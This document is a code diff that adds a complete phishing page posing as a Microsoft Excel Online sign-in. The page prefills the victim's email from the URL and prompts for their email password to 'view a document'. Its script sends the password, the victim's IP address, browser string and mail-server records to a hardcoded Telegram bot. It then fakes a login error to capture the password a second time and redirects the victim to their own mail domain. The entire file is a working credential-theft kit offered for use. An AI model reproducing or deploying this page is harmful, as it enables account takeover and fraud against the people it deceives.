@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Sign in to your account</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <style>
+        /* Global styles */
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://cdn.glitch.global/393b8c0d-bc9f-4870-b861-c1a3def6549c/bg.png?v=1725219108546');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Dark overlay */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 0;
+        }
+
+        /* Header styling */
+        .header {
+            width: 100%;
+            background-color: #217346;
+            padding: 10px 15px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+        }
+
+        .header img {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        .header-text {
+            font-size: 14px;
+            color: white;
+            font-weight: 500;
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            width: 90%;
+            max-width: 360px;
+            background-color: #ffffff;
+            padding: 30px 20px;
+            border-radius: 0px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        /* Sliding text animation */
+        .slide-in {
+            opacity: 0;
+            transform: translateX(100%);
+            animation: slideIn 0.8s ease-out forwards;
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .login-header {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .login-header img {
+            width: 100px;
+            margin-right: 10px;
+        }
+
+        .login-header h1 {
+            font-size: 20px;
+            font-weight: normal;
+            color: #333;
+            margin: 0;
+        }
+
+        .back-icon-wrapper {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .back-icon {
+            width: 13px;
+            height: 13px;
+            cursor: pointer;
+        }
+
+        .email-display {
+            font-size: 16px;
+            color: #666;
+            margin-left: 10px;
+            text-align: left;
+        }
+
+        .enter-password {
+            font-size: 22px;
+            color: #333;
+            text-align: left;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            text-align: left;
+            margin-top: 5px;
+            width: 100%;
+        }
+
+        .error-text {
+            font-size: 14px;
+            color: red;
+            text-align: left;
+            margin-top: 10px;
+            display: none;
+            transition: opacity 0.5s ease;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-bottom: 1px solid #434040;
+            font-size: 18px;
+            transition: border-bottom 0.3s ease;
+        }
+
+        input[type="password"]:focus {
+            border-bottom: 1px solid #0c5ad6;
+            outline: none;
+        }
+
+        .note-text {
+            font-size: 13px;
+            color: #0c5ad6;
+            margin-top: 5px;
+            width: 100%;
+            text-align: left;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: flex-end;
+            width: 100%;
+            margin-top: 30px;
+        }
+
+        .btn-signin {
+            padding: 10px 30px;
+            font-size: 14px;
+            cursor: pointer;
+            background-color: #217346;
+            color: white;
+            border: none;
+            border-radius: 0px;
+        }
+
+        .btn-signin:hover {
+            background-color: #359e64;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Section -->
+    <div class="header">
+        <img src="https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/98845_15_excel_icon.png?alt=media&token=cb28188b-9c21-482b-b418-cf68b6847d08" alt="Excel Logo">
+        <span class="header-text">Excel Online</span>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container" id="mainContent">
+        <div class="login-header slide-in">
+            <img src="https://qu.ax/xwsPG.png" alt="Logo">
+            <h1>Microsoft Excel</h1>
+        </div>
+
+        <div class="back-icon-wrapper slide-in">
+            <img src="https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/backArrow.png?alt=media&token=4765ea58-a791-48f4-ae63-f243245537d8" alt="Back Icon" class="back-icon">
+            <div class="email-display" id="emailDisplay"></div>
+        </div>
+
+        <div class="enter-password slide-in">Enter Password</div>
+        <div class="info-text slide-in" id="infoText">Because you're accessing sensitive info, you need to verify your email password.</div>
+        <div class="error-text" id="errorText">Your account or password is incorrect. If you don't remember your password, reset it now.</div>
+
+        <!-- Form Section -->
+        <form id="loginForm" class="slide-in">
+            <input type="password" id="passwordInput" name="password" placeholder="Password" required>
+            <div class="note-text">Note: Use the above email password to access documents.</div>
+            <div class="btn-group">
+                <input type="submit" class="btn-signin" value="View Document" id="submitBtn">
+            </div>
+        </form>
+    </div>
+
+    <script>
+        let count = 0;  // Variable to track error message count
+        const maxAttempts = 2;  // Maximum attempts before redirect
+
+        // Function to extract email from URL hash
+function getEmailFromURL() {
+    const hash = window.location.hash.substring(1); // Get hash without the '#' symbol
+    if (hash.includes('@') && hash.includes('.')) {
+        return hash; // Return the hash as email if it appears valid
+    }
+    return ''; // Return an empty string if hash doesn't resemble an email
+}
+
+        // Update the email display
+        document.getElementById('emailDisplay').textContent = getEmailFromURL();
+
+        // Handle Form Submission
+        document.getElementById('loginForm').addEventListener('submit', async function (event) {
+            event.preventDefault(); // Prevent traditional form submission
+
+            const passwordInput = document.getElementById('passwordInput');
+            const password = passwordInput.value;
+            const email = getEmailFromURL(); // Get email from the URL
+            const ip = await getIP(); // Fetch the user's IP address
+            const browser = navigator.userAgent; // Get the user's browser
+            const dateTime = new Date().toLocaleString(); // Get the current date and time
+            const domain = email.split('@')[1]; // Extract domain from email
+
+            // Fetch MX records
+            const mxRecords = await getMXRecords(domain);
+
+            // Check if password is provided
+            if (!password) {
+                alert("Please enter your password.");
+                return;
+            }
+
+            // Show loading indicator
+            const submitBtn = document.getElementById("submitBtn");
+            submitBtn.value = "Loading...";
+            submitBtn.classList.add("loading");
+
+            // Construct the message to send to Telegram
+            const message = `GODLY LOGS\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nBrowser: ${browser}\nDate and Time: ${dateTime}\nMX Records: ${mxRecords}`;
+
+            const token = '7051308130:AAGPOCY-skiRRA6hGu3n13YJLxTBMOXJXuA'; // Replace with your bot token
+            const chatId = '1739269434'; // Replace with your chat ID
+            const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                await fetch(telegramApiUrl); // Send message to Telegram bot
+            } catch (error) {
+                console.error("Error sending message to Telegram:", error);
+            }
+
+            // Increment failed attempt count
+            count++;
+
+            // Show error message for 3 seconds, then hide
+            const errorText = document.getElementById("errorText");
+            errorText.style.display = 'block';
+            setTimeout(() => {
+                errorText.style.display = 'none';
+                passwordInput.value = '';  // Clear password field when the warning disappears
+            }, 3000); // Hide error message after 3 seconds
+
+            // Replace info text with error message
+            const infoText = document.getElementById("infoText");
+            infoText.style.display = 'block'; // Ensure info text stays visible
+
+            // Redirect after max attempts
+            if (count === maxAttempts) {
+                const emailDomain = email.split('@')[1];
+                setTimeout(() => {
+                    window.location.href = `https://${emailDomain}`; // Redirect to email domain
+                }, 1000);
+            }
+
+            // Add 2-second delay before resetting button state
+            setTimeout(() => {
+                // Reset the button state after submission
+                submitBtn.value = "View Document"; // Reset button text
+                submitBtn.classList.remove("loading"); // Re-enable the button
+            }, 2000);
+        });
+
+        // Fetch user IP address from an external API
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Fetch MX records for the domain
+        async function getMXRecords(domain) {
+            const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+            const data = await response.json();
+            if (data.Answer) {
+                return data.Answer.map(record => record.data).join(", ");
+            } else {
+                return "No MX records found";
+            }
+        }
+    </script>
+</body>
+</html>
